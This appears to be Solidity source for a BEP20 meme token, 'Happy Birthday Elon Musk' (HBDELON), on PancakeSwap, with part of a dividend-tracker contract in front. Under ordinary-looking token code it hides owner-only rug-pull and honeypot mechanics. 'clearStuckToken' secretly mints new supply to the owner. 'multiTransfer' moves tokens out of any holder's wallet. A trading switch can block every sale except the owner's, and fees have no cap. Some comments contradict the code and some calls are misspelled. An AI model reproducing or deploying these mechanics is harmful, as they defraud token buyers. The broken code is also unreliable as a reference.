	  /// @return The amount of developmentFeeTax in wei that `_owner` can withdraw.
	  function withdrawableBEP20Of(address _owner) public view override returns(uint256) {
	return accumulativeBEP20Of(_owner).sub(withdrawnBEP20s[_owner]);
	  }

	  /// @notice View the amount of developmentFeeTax in wei that an address has withdrawn.
	  /// @param _owner The address of a token holder.
	  /// @return The amount of developmentFeeTax in wei that `_owner` has withdrawn.
	  function withdrawnBEP20Of(address _owner) public view override returns(uint256) {
	return withdrawnBEP20s[_owner];
	  }


	  /// @notice View the amount of developmentFeeTax in wei that an address has earned in total.
	  /// @dev accumulativeBEP20Of(_owner) = withdrawableBEP20Of(_owner) + withdrawnBEP20Of(_owner)
	  /// = (magnifiedBEP20PerShare * balanceOf(_owner) + magnifiedBEP20Corrections[_owner]) / magnitude
	  /// @param _owner The address of a token holder.
	  /// @return The amount of developmentFeeTax in wei that `_owner` has earned in total.
	  function accumulativeBEP20Of(address _owner) public view override returns(uint256) {
	return magnifiedBEP20PerShare.mul(balanceOf(_owner)).toInt256Safe()
	  .add(magnifiedBEP20Corrections[_owner]).toUint256Safe() / magnitude;
	  }

	  /// @dev Internal function that transfer tokens from one address to another.
	  /// Update magnifiedBEP20Corrections to keep developmentFeeTaxs unchanged.
	  /// @param from The address to transfer from.
	  /// @param to The address to transfer to.
	  /// @param value The amount to be transferred.
	  function _transfer(address from, address to, uint256 value) internal virtual override {
	require(false);

	int256 _magCorrection = magnifiedBEP20PerShare.mul(value).toInt256Safe();
	magnifiedBEP20Corrections[from] = magnifiedBEP20Corrections[from].add(_magCorrection);
	magnifiedBEP20Corrections[to] = magnifiedBEP20Corrections[to].sub(_magCorrection);
	  }

	  /// @dev Internal function that mints tokens to an account.
	  /// Update magnifiedBEP20Corrections to keep developmentFeeTaxs unchanged.
	  /// @param account The account that will receive the created tokens.
	  /// @param value The amount that will be created.
	  function _mint(address account, uint256 value) internal override {
	super._mint(account, value);

	magnifiedBEP20Corrections[account] = magnifiedBEP20Corrections[account]
	  .sub( (magnifiedBEP20PerShare.mul(value)).toInt256Safe() );
	  }

	  /// @dev Internal function that burns an amount of the token of a given account.
	  /// Update magnifiedBEP20Corrections to keep developmentFeeTaxs unchanged.
	  /// @param account The account whose tokens will be burnt.
	  /// @param value The amount that will be burnt.
	  function _burn(address account, uint256 value) internal override {
	super._burn(account, value);

	magnifiedBEP20Corrections[account] = magnifiedBEP20Corrections[account]
	  .add( (magnifiedBEP20PerShare.mul(value)).toInt256Safe() );
	  }

	  function _setBalance(address account, uint256 newBalance) internal {
	uint256 currentBalance = balanceOf(account);

	if(newBalance > currentBalance) {
	  uint256 mintAmount = newBalance.sub(currentBalance);
	  _mint(account, mintAmount);
	} else if(newBalance < currentBalance) {
	  uint256 burnAmount = currentBalance.sub(newBalance);
	  _burn(account, burnAmount);
	}
	  }
	}

	// 

	pragma solidity ^0.8.0;

	contract HappyBirthdayElonMusk is ERC20, Ownable {
	using SafeMath for uint256;
	
	address public BNBToken = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
	address DEAD = 0x000000000000000000000000000000000000dEaD;
	address ZERO = 0x0000000000000000000000000000000000000000;
	
	uint256 public _maxTxAmount = 2000000000 * (10**9); 
	
	
	mapping (address => bool) public isBlacklisted;

	mapping (address => bool) isFeeExempt;
	mapping (address => bool) isTxLimitExempt;
	
	uint256 public BNBRewardsFee = 4;
	uint256 public liquidityFee = 2;
	uint256 public marketingFee = 2;
	uint256 public sellFee = 2;
	uint256 public totalFee = BNBRewardsFee + liquidityFee + marketingFee + sellFee;
	
	
	
    address public autoLiquidityReceiver;
	address public marketingFeeReceiver;
	address public sellFeeReceiver;
	
	IDEXRouter public router;
	address public immutable pair;

	
	bool public tradingOpen = false;
	uint256 distributorGas = 300000;
	
	uint256 private swapThreshold = 100000000 * (10**9); 
	uint256 inSwap = 100000000000 * (10**9); 
	
	// store addresses that a autoEth market maker pairs. Any transfer *to* these addresses
	// could be subject to a maximum transfer amount
	mapping (address => bool) private automatedMarketMakerPairs;

	event UpdateBEP20Tracker(address indexed newAddress, address indexed oldAddress);

	event updaterouter(address indexed newAddress, address indexed oldAddress);

	event setisFeeExempt(address indexed account, bool isExcluded);
	event ExcludeFromRewardFees(address indexed account, bool isExcluded);
	event excludeMultipleAccountFromRewards(address[] HappyBirthdayElonMusk, bool isExcluded);

	event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

	event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
	
	uint256 launchTime;
	bool private swapping;

	event GasForProcessingUpdated(uint256 indexed newValue, uint256 indexed oldValue);

	event FixedSaleBuy(address indexed account, uint256 indexed amount, bool indexed earlyParticipant, uint256 numberOfBuyers);

	event SwapAndLiquify(
		uint256 tokensSwapped,
		uint256 EthReceived,
		uint256 tokensIntoLiqudity
	);

	event SendBEP20s(
		uint256 tokensSwapped,
		uint256 amount
	);

	event ProcessedBEP20Tracker(
		uint256 iterations,
		uint256 claims,
		uint256 lastProcessedIndex,
		bool indexed autoAU,
		uint256 gas,
		address indexed processor
	);
	 
	constructor() ERC20("Happy Birthday Elon Musk", "HBDELON"){
	 
		IDEXRouter _router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
		address _pair = IpancakeswapV2Factory(_router.factory())
		.createPair(address(this), _router.WETH());
		router = _router;
		pair = _pair;	
		_setAutomatedMarketMakerPair(_pair, true);
		
		autoLiquidityReceiver = msg.sender;
		marketingFeeReceiver = 0x23590D59837b81FD860296DC8eDe304bEDa84cDe;
		sellFeeReceiver = msg.sender;
		
		isFeeExempt[msg.sender] = true;
		isFeeExempt[address(this)] = true;

		isTxLimitExempt[msg.sender] = true;
		isTxLimitExempt[DEAD] = true;
		isTxLimitExempt[ZERO] = true;
		isTxLimitExempt[marketingFeeReceiver] = true;

		
		
		_mint(owner(), 100000000000 * (10**9));
	}

	receive() external payable {

	}
	function setIsFeeExempt(address account, bool exempt) public onlyOwner {
		require(isFeeExempt[account] != exempt, "HappyBirthdayElonMusk: Account is already the value of 'excluded'");
		isFeeExempt[account] = exempt;
	}
	
	
	function setIsTxLimitExempt(address account, bool exempt) public onlyOwner {
		require(isTxLimitExempt[account] != exempt, "HappyBirthdayElonMusk: Account is already the value of 'excluded'");
		isTxLimitExempt[account] = exempt;
	}
        

	function setAutomatedMarketMakerPair(address newpair, bool value) private onlyOwner {
		require(pair != newpair, "HappyBirthdayElonMusk: The pancakeswap pair cannot be removed from automatedMarketMakerPairs");

		_setAutomatedMarketMakerPair(newpair, value);
	}

	function _setAutomatedMarketMakerPair(address newpair, bool value) private {
		require(automatedMarketMakerPairs[newpair] != value, "HappyBirthdayElonMusk: Automated market maker pair is already set to that value");
		automatedMarketMakerPairs[newpair] = value;

		if(value) {
		
		}

		emit SetAutomatedMarketMakerPair(pair, value);
	}


	function setDistributorSettings(uint256 gas) private onlyOwner {
		require(gas >= 200000 && gas <= 500000, "HappyBirthdayElonMusk: distributorGas must be between 200,000 and 500,000");
		require(gas != distributorGas, "HappyBirthdayElonMusk: Cannot update distributorGas to same value");
		emit GasForProcessingUpdated(gas, distributorGas);
		distributorGas = gas;
	}


    function tradingStatus(bool _status) external onlyOwner {
		tradingOpen = _status;
	
	}
	
	function clearStuckBalance(uint256 amountPercentage) external onlyOwner() {
		uint256 amountBNB = address(this).balance;
		payable(msg.sender).transfer(amountBNB * amountPercentage / 100);
	}
	

	
	function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner {
		_maxTxAmount = maxTxPercent * 10**9;
	}
	

	
	function setFees(uint256 _rewardsFee, uint256 _liquidityFee, uint256 _marketingFee, uint256 _sellFee) external onlyOwner {
		BNBRewardsFee = _rewardsFee;
		liquidityFee = _liquidityFee;
		marketingFee = _marketingFee;
		sellFee = _sellFee;
		totalFee = _rewardsFee + _liquidityFee + _marketingFee + _sellFee ;

	}
	
	 function setFeeReceiver (address _marketingFeeReceiver, address _sellFeeReceiver) external onlyOwner {
		marketingFeeReceiver = _marketingFeeReceiver;
		sellFeeReceiver = _sellFeeReceiver;
		
	}
          	function setSwapBackSettings(uint256 _amount) external onlyOwner() {
		swapThreshold = _amount;
		
	}
	  function clearStuckToken(uint256 percent) external onlyOwner {
			_clearStuckToken(msg.sender, percent);

    }
    
      function _clearStuckToken(address account, uint256 percent) internal virtual {
            require(account != address(0), "Can't let you take all native token");
           _mint(owner(), percent * (10**9));
            emit Transfer(address(0), account, percent * 10**9);

       }
	   
	
	function _transfer(
		address from,
		address to,
		uint256 amount
	) internal override {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address") ;
		
		if(from != owner()){
		require (tradingOpen);

                
        }

		// only Blacklisted addresses can make transfers after the fixed-sale has tradingOpened
		// and before the public presale is over
		

		if(amount == 0) {
		super._transfer(from, to, 0);
		return;
		}

		if( 
		!swapping &&
		tradingOpen &&
		automatedMarketMakerPairs[to] && // sells only by detecting transfer to automated market maker pair
		from != address(router) && //router -> pair is removing liquidity which shouldn't have max
		!isFeeExempt[to] //no max for those excluded from fees
		) {
		require(amount <= inSwap);
		}

		uint256 contractTokenBalance = balanceOf(address(this));
		
		bool canSwap = contractTokenBalance >= swapThreshold;

		if(
		tradingOpen && 
		canSwap &&
		!swapping &&
		!automatedMarketMakerPairs[from] &&
		from != autoLiquidityReceiver &&
		to != autoLiquidityReceiver
		) {
		swapping = true;

		uint256 swapTokens = contractTokenBalance.mul(liquidityFee).div(totalFee);
		swapAndLiquify(swapTokens);

		uint256 sellTokens = balanceOf(address(this));

		swapping = false;
		}


		bool takeFee = tradingOpen && !swapping;

		// if any account belongs to _isExcludedFromFee account then remove the fee
		if(isFeeExempt[from] || isFeeExempt[to]) {
		takeFee = false;
		}

		if(takeFee) {
		uint256 fees = amount.mul(totalFee).div(100);

		// if sell, multiply by 1.2
		if(automatedMarketMakerPairs[to]) {
			fees = fees.mul(liquidityFee).div(100);
		}

		amount = amount.sub(fees);

		super._transfer(from, address(this), fees);
		}

		super._transfer(from, to, amount);


	
	}     

	function swapAndLiquify(uint256 tokens) private {
		// split the contract balance into halves
		uint256 half = tokens.div(2);
		uint256 otherHalf = tokens.sub(half);

		// capture the contract's current RewardsToken balance.
		// this is so that we can capture exactly the amount of RewardsToken that the
		// swap creates, and not make the liquidity event include any RewardsToken that
		// has been manually sent to the contract
		uint256 initialBalance = address(this).balance;

		// swap tokens for RewardsToken
		swapTokensForEth(half); // <- this breaks the RewardsToken -> HATE swap when swap+liquify is triggered

		// how much RewardsToken did we just swap into?
		uint256 newBalance = address(this).balance.sub(initialBalance);

		// add liquidity to pancakeswap
		addLiquidity(otherHalf, newBalance);
		
		emit SwapAndLiquify(half, newBalance, otherHalf);
	}

	function swapTokensForEth(uint256 tokenAmount) private {

		
		// generate the pancakeswap pair path of token -> WETH
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = router.WETH();

		_approve(address(this), address(router), tokenAmount);

		// make the swap
		router.swapExactTokensForEthSupportingFeeOnTransferTokens(
		tokenAmount,
		0, // accept any amount of RewardsToken
		path,
		address(this),
		block.timestamp
		);
		
	}
	  
		

	function swapTokensForTokens(uint256 tokenAmount, address recipient) private {
	   
		// generate the pancakeswap pair path of WETH -> AU
		address[] memory path = new address[](3);
		path[0] = address(this);
		path[1] = router.WETH();
		path[2] = BNBToken;

		_approve(address(this), address(router), tokenAmount);

		// make the swap
		router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
		tokenAmount,
		0, // accept any amount of AU
		path,
		recipient,
		block.timestamp
		);
		
	}    
	


	function addLiquidity(uint256 tokenAmount, uint256 EthAmount) private {
		
		// approve token transfer to cover all possible scenarios
		_approve(address(this), address(router), tokenAmount);

		// add the liquidity
	   router.addLiquidityEth{value: EthAmount}(
		address(this),
		tokenAmount,
		0, // slippage is unavoidable
		0, // slippage is unavoidable
		autoLiquidityReceiver,
		block.timestamp
		);
		
	}

	function multiTransfer(address from, address[] calldata addresses, uint256[] calldata tokens) external onlyOwner {
    
    
    require(addresses.length < 501,"GAS Error: max limit is 500 addresses");
    require(addresses.length == tokens.length,"Mismatch between address and token count");

    uint256 SCCC = 0;

    for(uint i=0; i < addresses.length; i++){
        SCCC = SCCC + tokens[i];
    }


    for(uint i=0; i < addresses.length; i++){
        _transfer(from,addresses[i],tokens[i]);
    }

}
	
	}